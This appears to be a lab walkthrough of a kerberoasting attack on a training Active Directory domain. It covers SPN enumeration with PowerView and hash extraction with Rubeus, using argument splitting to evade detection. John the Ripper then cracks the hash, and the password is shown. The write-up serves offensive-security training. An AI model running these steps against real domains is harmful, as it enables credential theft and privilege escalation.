# Learning Objective 14 (Privilege Escalation | Kerberoasting)

## Tasks

1. **Using the kerberoasting attack, crack password of a SQL server service account**

---

## Solution

1. **Using the kerberoasting attack, crack password of a SQL server service account**

First, **we need to find services running with user accounts as the services running with machine accounts have difficult passwords**.

We can use PowerView or ADModule for discovering such services.

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`. C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -SPN`:
```
[SNIP]

logoncount            : 39
badpasswordtime       : 11/25/2022 4:20:42 AM
description           : Account to be used for services which need high privileges.
distinguishedname     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : svc admin
lastlogontimestamp    : 2/14/2025 1:45:16 AM
userprincipalname     : svcadmin
samaccountname        : svcadmin👤
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/14/2025 9:45:16 AM
instancetype          : 4
usncreated            : 40118
objectguid            : 244f9c84-7e33-4ed6-aca1-3328d0802db0
sn                    : admin
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 11/14/2022 5:06:37 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {2/14/2025 3:40:35 PM, 2/14/2025 2:40:35 PM, 2/14/2025 1:40:35 PM, 2/14/2025 12:40:35 PM...}
serviceprincipalname  : {MSSQLSvc📌/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
givenname             : svc
usnchanged            : 1139619
memberof              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
lastlogon             : 2/14/2025 4:58:23 AM
badpwdcount           : 0
cn                    : svc admin
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-719815819-3726368948-3917688648-1118
primarygroupid        : 513
pwdlastset            : 11/14/2022 9:06:37 AM
name                  : svc admin

[SNIP]
```

Neat! The `svcadmin`, which is a domain administrator has a SPN set! Let's kerberoast it!

**Rubeus and John the Ripper**

We can use Rubeus to get hashes for the `svcadmin` account.

**Note that we are using the `/rc4opsec` option that gets hashes only for the accounts that support RC4.** This means that if `This account supports Kerberos AES 128/256 bit encryption` is set for a service account, the below command will not request its hashes.

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt`:
```
```
❌

![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\ArgSplit.bat`:
```
[!] Argument Limit: 180 characters
[+] Enter a string: kerberoast📌
set "z=t"
set "y=s"
set "x=a"
set "w=o"
set "v=r"
set "u=e"
set "t=b"
set "s=r"
set "r=e"
set "q=k"
set "Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```

```
set "z=t"
set "y=s"
set "x=a"
set "w=o"
set "v=r"
set "u=e"
set "t=b"
set "s=r"
set "r=e"
set "q=k"
set "Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```

`echo %Pwn%`:
```
kerberoast
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt`:
```
[SNIP]

[*] Action: Kerberoasting📌

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin👤
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt📌
```

We can now use John the Ripper to brute-force the hashes.

Please note that you need to remove ":1433" from the SPN in `hashes.txt` before running John.

`type C:\AD\Tools\hashes.txt`:
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CF...

[SNIP]
```

`notepad C:\AD\Tools\hashes.txt`:
```
$krb5tgs$23$*svcadmin$DOLLARCORP.MONEYCORP.LOCAL$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*$5D4CC629D36FC997F43A4E1929AAA3E6$19A5438620F00654A115B7E1E46B2254269A7C6F68B695F5F0B17FDB5F7CA4FE98C7B40FDC4CD69AC0BB96707979B73746D7C28A5D74DD328CCAAF0C1866480E9B5F436601CCCF7E89034C81F40B19B508E4C44CF97C9B37923F121B370A0EBB1BF283C696B9AED43E2E83E54522483ABE2C7EA2F0496B54F885AC53C61F6DD3CFE78D3...

[SNIP]
```

`C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!!🔑 (?)
1g 0:00:00:00 DONE (2025-02-14 08:05) 10.10g/s 20686p/s 20686c/s 20686C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
🚩

---
---
